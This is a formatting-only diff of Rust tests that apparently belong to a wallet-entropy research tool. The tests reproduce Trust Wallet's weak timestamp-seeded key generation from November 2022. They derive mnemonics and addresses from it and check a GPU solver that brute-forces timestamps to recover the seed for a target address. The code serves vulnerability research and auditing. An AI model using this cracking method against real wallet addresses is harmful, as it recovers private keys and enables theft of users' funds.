@@ -16,7 +16,7 @@ fn generate_trust_wallet_entropy(timestamp: u32) -> [u8; 16] {
     // LSB extraction: take only lower 8 bits from each of 16 words
     for i in 0..16 {
         let val = rng.next_u32();
-        entropy[i] = (val & 0xFF) as u8;  // LSB only!
+        entropy[i] = (val & 0xFF) as u8; // LSB only!
     }
     entropy
 }
@@ -39,26 +39,26 @@ fn generate_address_from_entropy(entropy: &[u8; 16]) -> String {
 #[test]
 fn test_trust_wallet_timestamp_vectors() {
     println!("\n=== Trust Wallet Timestamp Test Vectors ===\n");
-    
+
     // Test within the vulnerable window (Nov 14-23, 2022)
     let test_timestamps = vec![
         1668384000u32, // Nov 14 2022 00:00:00 UTC
         1668470400u32, // Nov 15 2022 00:00:00 UTC
         1669247999u32, // Nov 23 2022 23:59:59 UTC
     ];
-    
+
     for ts in test_timestamps {
         let entropy = generate_trust_wallet_entropy(ts);
         let mnemonic = Mnemonic::from_entropy(&entropy).expect("Valid");
         let address = generate_address_from_entropy(&entropy);
-        
+
         println!("Timestamp: {}", ts);
         println!("  Entropy: {}", hex::encode(&entropy));
         println!("  Mnemonic: {}...", &mnemonic.to_string()[..40]);
         println!("  Address: {}", address);
         println!();
     }
-    
+
     println!("✓ Trust Wallet test vectors generated!");
 }
 
@@ -66,9 +66,9 @@ fn test_trust_wallet_timestamp_vectors() {
 #[test]
 fn test_trust_wallet_gpu_crack() {
     use entropy_lab_rs::scans::gpu_solver::GpuSolver;
-    
+
     println!("\n=== Trust Wallet GPU Crack Test ===\n");
-    
+
     let solver = match GpuSolver::new() {
         Ok(s) => s,
         Err(e) => {
@@ -76,25 +76,27 @@ fn test_trust_wallet_gpu_crack() {
             return;
         }
     };
-    
+
     // Generate a known address for a specific timestamp
     let test_ts = 1668470400u32; // Nov 15 2022
     let cpu_entropy = generate_trust_wallet_entropy(test_ts);
     let cpu_address = generate_address_from_entropy(&cpu_entropy);
-    
+
     println!("Test timestamp: {} (Nov 15 2022)", test_ts);
     println!("CPU address: {}", cpu_address);
-    
+
     // Extract hash160 for GPU
-    let addr = bitcoin::Address::from_str(&cpu_address).unwrap().assume_checked();
+    let addr = bitcoin::Address::from_str(&cpu_address)
+        .unwrap()
+        .assume_checked();
     let script = addr.script_pubkey();
     let target_hash160: [u8; 20] = script.as_bytes()[3..23].try_into().unwrap();
     println!("Target Hash160: {}", hex::encode(&target_hash160));
-    
+
     // Search a small window around the known timestamp
     let start = test_ts - 5;
     let end = test_ts + 5;
-    
+
     match solver.compute_trust_wallet_crack(start, end, &target_hash160) {
         Ok(results) => {
             if results.contains(&(test_ts as u64)) {
@@ -112,6 +114,6 @@ fn test_trust_wallet_gpu_crack() {
             panic!("GPU crack failed");
         }
     }
-    
+
     println!("\n✓ Trust Wallet GPU verification passed!");
 }
